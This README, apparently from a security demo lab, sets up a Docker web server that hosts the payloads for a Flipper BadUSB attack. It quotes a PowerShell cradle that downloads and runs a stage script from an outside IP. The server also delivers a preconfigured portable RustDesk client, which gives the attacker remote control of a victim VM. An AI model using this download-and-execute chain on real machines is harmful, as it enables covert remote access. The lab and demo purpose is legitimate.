# Act 1 lab web server (Docker)

Serves the three Act 1 bootstrap files on `64.58.102.35:80`, the same host as the
RustDesk hbbs/hbbr. This is what the Flipper cradle in `../act1-badusb.txt` hits:
`iwr http://64.58.102.35/stage.ps1 | iex`.

## Files served
| URL | Source | Notes |
|-----|--------|-------|
| `/stage.ps1` | `../stage.ps1` (bind-mount, read-only) | the bootstrap |
| `/RustDesk2.toml` | `../RustDesk2.toml` (bind-mount, read-only) | per-user config, key already filled |
| `/rustdesk.exe` | `./rustdesk.exe` (you add this) | **portable** RustDesk client |

Edit the real `stage.ps1` / `RustDesk2.toml` in `demo-lab/` — the container serves them
live, no rebuild needed.

## Before first run
1. Download the **portable** RustDesk Windows client and save it here as `rustdesk.exe`:
   ```
   demo-lab/webserver/rustdesk.exe
   ```
   (Portable = the standalone `.exe`, not the installer. Match the victim VM's arch,
   normally x86_64.)
2. Bring it up on the Docker host:
   ```
   cd demo-lab/webserver
   docker compose up -d
   ```
3. Verify from the host (or lab network):
   ```
   curl -I http://64.58.102.35/stage.ps1
   curl -I http://64.58.102.35/rustdesk.exe
   ```

## Lock it down (do this — the host is public)
Port 80 serves an attack bootstrap over plaintext HTTP on a publicly routable IP.
Restrict it to the lab's egress IP before the show. Example with ufw:
```
ufw allow from <LAB_EGRESS_IP> to any port 80 proto tcp
ufw deny 80/tcp
```
Or scope it in your cloud provider's security group. Take it down right after the demo:
```
docker compose down
```
